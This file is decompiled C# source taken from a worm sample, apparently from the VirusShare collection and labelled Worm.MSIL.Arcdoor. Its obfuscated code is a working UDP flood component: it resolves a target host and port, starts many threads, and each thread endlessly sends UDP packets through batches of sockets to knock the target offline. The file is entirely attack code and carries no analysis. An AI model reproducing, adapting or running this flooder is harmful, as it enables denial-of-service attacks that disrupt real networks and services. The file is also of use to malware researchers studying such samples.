// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9569351C-F5E3-4236-91AC-2AEE7C964AEF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Arcdoor.vqy-910dbff7657bb46b4bc3c388dbad3449c49288a2d745c58617744728da450e6b.exe

using System.Net;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u0008
{
  private static ThreadStart[] \u0002;
  private static Thread[] \u0003;
  private static \u0008.\u0002[] \u0005;
  private static IPEndPoint \u0008;
  public static string \u0006;
  public static int \u000E;
  public static int \u000F;
  public static int \u0002\u2000;
  public static int \u0003\u2000;

  public static void \u0002()
  {
    try
    {
      \u0008.\u0008 = new IPEndPoint(Dns.GetHostEntry(\u0008.\u0006).AddressList[0], \u0008.\u000E);
    }
    catch
    {
      \u0008.\u0008 = new IPEndPoint(IPAddress.Parse(\u0008.\u0006), \u0008.\u000E);
    }
    \u0008.\u0003 = new Thread[\u0008.\u000F];
    \u0008.\u0002 = new ThreadStart[\u0008.\u000F];
    \u0008.\u0005 = new \u0008.\u0002[\u0008.\u000F];
    for (int index = 0; index < \u0008.\u000F; ++index)
    {
      \u0008.\u0005[index] = new \u0008.\u0002(\u0008.\u0008, \u0008.\u0002\u2000, \u0008.\u0003\u2000);
      \u0008.\u0002[index] = new ThreadStart(\u0008.\u0005[index].\u0002);
      \u0008.\u0003[index] = new Thread(\u0008.\u0002[index]);
      \u0008.\u0003[index].Start();
    }
  }

  public static void \u0003()
  {
    for (int index = 0; index < \u0008.\u000F; ++index)
    {
      try
      {
        \u0008.\u0003[index].Abort();
        \u0008.\u0003[index] = (Thread) null;
        \u0008.\u0002[index] = (ThreadStart) null;
        \u0008.\u0005[index] = (\u0008.\u0002) null;
      }
      catch
      {
      }
    }
  }

  private sealed class \u0002
  {
    private IPEndPoint \u0002;
    private Socket[] \u0003;
    private int \u0005;
    private int \u0008;

    public \u0002(IPEndPoint _param1, int _param2, int _param3)
    {
      this.\u0002 = _param1;
      this.\u0005 = _param2;
      this.\u0008 = _param3;
    }

    public void \u0002()
    {
      while (true)
      {
        byte[] buffer = new byte[this.\u0008];
        try
        {
          this.\u0003 = new Socket[this.\u0005];
          for (int index = 0; index < this.\u0005; ++index)
          {
            this.\u0003[index] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            this.\u0003[index].Blocking = false;
            this.\u0003[index].SendTo(buffer, (EndPoint) this.\u0002);
          }
          Thread.Sleep(100);
          for (int index = 0; index < this.\u0005; ++index)
          {
            if (this.\u0003[index].Connected)
              this.\u0003[index].Disconnect(false);
            this.\u0003[index].Close();
            this.\u0003[index] = (Socket) null;
          }
          this.\u0003 = (Socket[]) null;
        }
        catch
        {
          for (int index = 0; index < this.\u0005; ++index)
          {
            try
            {
              if (this.\u0003[index].Connected)
                this.\u0003[index].Disconnect(false);
              this.\u0003[index].Close();
              this.\u0003[index] = (Socket) null;
            }
            catch
            {
            }
          }
        }
      }
    }
  }
}
